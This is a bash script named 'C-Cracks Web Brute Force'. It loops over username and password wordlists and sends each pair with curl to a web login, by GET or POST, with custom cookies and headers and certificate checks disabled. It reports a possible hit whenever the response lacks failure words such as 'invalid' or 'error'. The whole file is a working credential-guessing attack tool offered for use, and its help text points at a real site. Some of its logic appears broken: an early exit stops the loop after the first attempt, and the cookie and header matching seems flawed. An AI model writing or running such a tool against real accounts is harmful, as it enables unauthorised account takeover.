
#!/bin/bash

user_f=$1 ; pass_f=$2 ;  method=$3 ; cookie=$5 ; header=$6

# help menu
figlet "C-Cracks" ; figlet "Web Brute Force"
if [[ $( echo "$1" | grep "help" ) ]]; then
	echo "Example: ./brute-force.sh users.txt passes.txt 'cookie PHPSESSID=12345;Cookie2=value' 'header header:123;header2:456' post 'user={user}&pass={pass}' https://www.google.com"
	echo "Example 2: ./brute-force.sh users.txt passes.txt get http://www.google.com/?user={user}&pass={pass}'"
	exit 0
fi

# if the 5th param provided is for headers, cookies, not filled in and everything else
case "$cookie" in
	"header ") 
		headers=( `echo "$cookie" | sed 's/;/\n/g'` )
		headers=( "${headers[@]/#/--header }" )
		;;
	"cookie ")
		cookies=( `echo "$cookie" | sed 's/;/\n/g'` )
		cookies=( "${cookies[@]/#/--cookie }" ) 
		;;
	*) ;;
esac	
# if the 6th param provided is for headers, not filled in and everything else
case "$header" in
	"header ")
		headers=( `echo "$header" | sed 's/;/\n/g'` )
		headers=( "${headers[@]/#/--header }" )
		;;
	*) ;;
esac

# begin loop of user and pass files 
echo -e "Brute force in progress...\n"
while IFS="" read -r u || [ -n "$u" ]
do
	while IFS="" read -r p || [ -n "$p" ]
	do
		url=$4 
		case "$method" in
			"get"|"g"|"G"|"GET")
				url=$( echo "${url}" | sed -e s/{user}/"$u"/g -e s/{pass}/"$p"/g ) 
				if [[ $( curl -v --insecure "${cookies[@]}" "${headers[@]}" "${url}" | grep -E -- "Invalid|invalid|incorrect|wrong|Incorrect|Wrong|Fail|fail|ERROR|error" ) ]] ; then echo "Nope." && continue
				else echo "Hmm... Could have a hit here ($u:$p)" && exit 0
				fi 
				;;
			"POST"|"P"|"p"|"post")
				if [[ $( echo "$header" | grep -v "header " ) ]] ; then data=$6
				elif [[ $( echo "$cookie" | grep -v -E -- "header |cookie " ) ]] ; then data=$5
				fi

				data=$( echo "${data}" | sed -e s/{user}/"$u"/g -e s/{pass}/"$p"/g )
				if [[ $( curl -v "${url}" -s --insecure "${cookies[@]}" "${headers[@]}" -d "${data}" 2>&1 |  grep -E -- "Invalid|invalid|incorrect|wrong|Incorrect|Wrong|Fail|fail|ERROR|error" ) ]] ; then 
					echo "$u:$p = Nope." && continue
				else echo "$u:$p = Intriguing. ;3" && exit 0
				fi
				;;
			*) echo "Provided method is invalid." ;;
		esac
		exit 0
	done < "$pass_f"
done < "$user_f"
exit 0





